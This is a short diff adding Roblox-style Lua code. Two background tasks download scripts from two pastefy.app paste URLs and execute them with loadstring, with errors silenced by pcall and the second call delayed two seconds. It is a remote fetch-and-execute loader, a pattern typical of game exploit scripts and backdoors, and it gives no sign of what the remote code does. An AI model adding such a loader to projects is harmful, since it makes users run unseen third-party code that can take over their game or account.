@@ -1,0 +1,12 @@
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/ycOQU3Uu/raw"))()
+    end)
+end)
+
+task.spawn(function()
+    task.wait(2)
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/Bd0nXk4b/raw", true))()
+    end)
+end)
